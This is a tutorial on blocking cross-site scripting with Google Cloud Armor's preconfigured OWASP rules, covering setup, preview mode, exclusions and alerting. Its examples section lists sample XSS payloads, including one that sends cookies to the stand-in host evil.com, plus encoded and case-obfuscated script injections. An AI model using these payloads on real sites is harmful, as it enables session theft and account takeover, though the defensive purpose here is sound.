# How to Block Cross-Site Scripting Attacks Using Cloud Armor Preconfigured Rules

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: GCP, Cloud Armor, XSS, Web Security, WAF

Description: Protect your web applications from cross-site scripting attacks by deploying Cloud Armor preconfigured WAF rules that detect and block XSS payloads at the edge.

---

Cross-site scripting (XSS) remains one of the most common web application vulnerabilities. Attackers inject malicious scripts into web pages, which then execute in the browsers of other users. The consequences range from session hijacking to full account takeover. While fixing XSS in your application code is the right long-term approach, Cloud Armor gives you an immediate layer of defense by catching XSS payloads before they reach your backend.

Google Cloud Armor includes preconfigured WAF rules based on the OWASP ModSecurity Core Rule Set. These rules have been tuned for low false positives and can be deployed in minutes. Here is how to set them up.

## Understanding the XSS Rule Set

Cloud Armor's XSS protection is part of the preconfigured WAF rule set identified as `xss-v33-stable`. This rule set includes detection for:

- Script tag injection (`<script>alert(1)</script>`)
- Event handler injection (`onerror=`, `onload=`, etc.)
- JavaScript URI injection (`javascript:alert(1)`)
- HTML attribute injection with script content
- Encoded and obfuscated XSS payloads
- DOM-based XSS patterns

The rules inspect multiple parts of the request including URL paths, query parameters, request headers, and POST body content.

## Step 1: Create a Security Policy

If you do not already have a Cloud Armor security policy, create one:

```bash
# Create a Cloud Armor security policy for WAF rules
gcloud compute security-policies create xss-protection-policy \
  --description="WAF policy with XSS protection rules" \
  --project=your-project-id
```

## Step 2: Add the XSS Preconfigured Rule

Add the XSS rule set to your security policy:

```bash
# Add the XSS preconfigured WAF rule at a specific priority
gcloud compute security-policies rules create 1000 \
  --security-policy=xss-protection-policy \
  --expression="evaluatePreconfiguredExpr('xss-v33-stable')" \
  --action=deny-403 \
  --description="Block cross-site scripting attacks using OWASP rules"
```

This single rule deploys the entire XSS rule set. Every incoming request will be evaluated against all the XSS detection signatures.

## Step 3: Start in Preview Mode

Before enforcing the rule, it is a good idea to run it in preview mode first. This logs what would have been blocked without actually blocking anything:

```bash
# Add the rule in preview mode for testing
gcloud compute security-policies rules create 1000 \
  --security-policy=xss-protection-policy \
  --expression="evaluatePreconfiguredExpr('xss-v33-stable')" \
  --action=deny-403 \
  --preview \
  --description="Preview: XSS protection rules"
```

Let this run for a few days while monitoring the logs to check for false positives.

## Step 4: Attach the Policy to Your Backend Service

Apply the security policy to your backend service:

```bash
# Attach the security policy to your backend service
gcloud compute backend-services update your-web-backend \
  --security-policy=xss-protection-policy \
  --global \
  --project=your-project-id
```

## Step 5: Monitor for Matches

Check Cloud Logging to see what the XSS rules are catching:

```bash
# View XSS rule matches in Cloud Armor logs
gcloud logging read \
  'resource.type="http_load_balancer" AND jsonPayload.enforcedSecurityPolicy.preconfiguredExprIds:("owasp-crs-v030301-id941")' \
  --project=your-project-id \
  --limit=20 \
  --format=json
```

The rule IDs starting with `941` are the XSS-specific rules from the OWASP Core Rule Set.

## Handling False Positives

The most common challenge with WAF rules is false positives - legitimate requests that look like attacks. For example, a CMS that allows HTML input might have legitimate requests that trigger XSS rules.

### Excluding Specific Sub-Rules

You can exclude specific detection signatures that are causing false positives while keeping the rest of the XSS protection active:

```bash
# Enable XSS rules but exclude specific sub-rules causing false positives
gcloud compute security-policies rules update 1000 \
  --security-policy=xss-protection-policy \
  --expression="evaluatePreconfiguredExpr('xss-v33-stable', ['owasp-crs-v030301-id941160-xss', 'owasp-crs-v030301-id941340-xss'])" \
  --action=deny-403 \
  --description="XSS protection with false positive exclusions"
```

### Combining with Path-Based Conditions

If only certain paths trigger false positives, you can scope the rule to exclude those paths:

```bash
# Apply XSS rules only to non-admin paths
gcloud compute security-policies rules update 1000 \
  --security-policy=xss-protection-policy \
  --expression="!request.path.matches('/admin/editor.*') && evaluatePreconfiguredExpr('xss-v33-stable')" \
  --action=deny-403 \
  --description="XSS protection excluding admin editor paths"
```

## Sensitivity Levels

Cloud Armor XSS rules come in different sensitivity levels. Higher sensitivity catches more attacks but also produces more false positives:

```bash
# Use sensitivity level 1 (lowest - fewest false positives)
gcloud compute security-policies rules create 1000 \
  --security-policy=xss-protection-policy \
  --expression="evaluatePreconfiguredExpr('xss-v33-stable', ['owasp-crs-v030301-id941150-xss', 'owasp-crs-v030301-id941320-xss', 'owasp-crs-v030301-id941330-xss', 'owasp-crs-v030301-id941340-xss'])" \
  --action=deny-403 \
  --description="XSS protection at sensitivity level 1"
```

A practical approach is to start at sensitivity level 1, monitor for a week, then gradually increase sensitivity by removing exclusions.

## Combining XSS Rules with Other OWASP Rules

XSS protection is just one piece of the puzzle. You should combine it with other preconfigured WAF rules for comprehensive protection:

```bash
# Add SQL injection protection
gcloud compute security-policies rules create 1100 \
  --security-policy=xss-protection-policy \
  --expression="evaluatePreconfiguredExpr('sqli-v33-stable')" \
  --action=deny-403 \
  --description="Block SQL injection attacks"

# Add local file inclusion protection
gcloud compute security-policies rules create 1200 \
  --security-policy=xss-protection-policy \
  --expression="evaluatePreconfiguredExpr('lfi-v33-stable')" \
  --action=deny-403 \
  --description="Block local file inclusion attacks"

# Add remote file inclusion protection
gcloud compute security-policies rules create 1300 \
  --security-policy=xss-protection-policy \
  --expression="evaluatePreconfiguredExpr('rfi-v33-stable')" \
  --action=deny-403 \
  --description="Block remote file inclusion attacks"

# Add remote code execution protection
gcloud compute security-policies rules create 1400 \
  --security-policy=xss-protection-policy \
  --expression="evaluatePreconfiguredExpr('rce-v33-stable')" \
  --action=deny-403 \
  --description="Block remote code execution attacks"
```

## Real-World XSS Attack Examples

Here are some XSS payloads that Cloud Armor's rules will catch:

**Basic script injection:**
```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Event handler injection:**
```
https://example.com/profile?name="><img src=x onerror=alert(1)>
```

**Encoded payloads:**
```
https://example.com/page?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

**Obfuscated injection:**
```
https://example.com/data?val=<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>
```

Cloud Armor's rules decode URL encoding, handle case variations, and detect obfuscation techniques before matching against attack signatures.

## Setting Up Alerts for XSS Attacks

Create an alert to notify your security team when XSS attacks are detected:

```bash
# Create a log-based metric for XSS blocks
gcloud logging metrics create xss-attacks-blocked \
  --project=your-project-id \
  --description="Count of XSS attacks blocked by Cloud Armor" \
  --log-filter='resource.type="http_load_balancer" AND jsonPayload.enforcedSecurityPolicy.preconfiguredExprIds:("owasp-crs-v030301-id941")'
```

You can then build a monitoring alert on this metric to get notified of attack spikes.

## Best Practices

From experience running these rules in production:

1. **Always start in preview mode.** Even well-tuned WAF rules can surprise you with false positives in your specific application context.
2. **Monitor continuously.** Attack patterns change, and new false positives can appear when your application changes.
3. **Layer your defenses.** Cloud Armor WAF rules are one layer. Also sanitize input in your application, use Content Security Policy headers, and encode output properly.
4. **Keep rules updated.** Google updates the preconfigured rule sets periodically. Check for new versions and test upgrades in preview mode.
5. **Log everything.** In the event of an incident, Cloud Armor logs provide forensic evidence of the attack patterns used.

## Wrapping Up

Cloud Armor's preconfigured XSS rules give you immediate protection against one of the most common web vulnerabilities. The setup takes minutes, and the rules are maintained by Google's security team. Start with preview mode, tune out any false positives, then enforce. Combined with proper application-level security practices, these WAF rules significantly reduce your XSS attack surface.
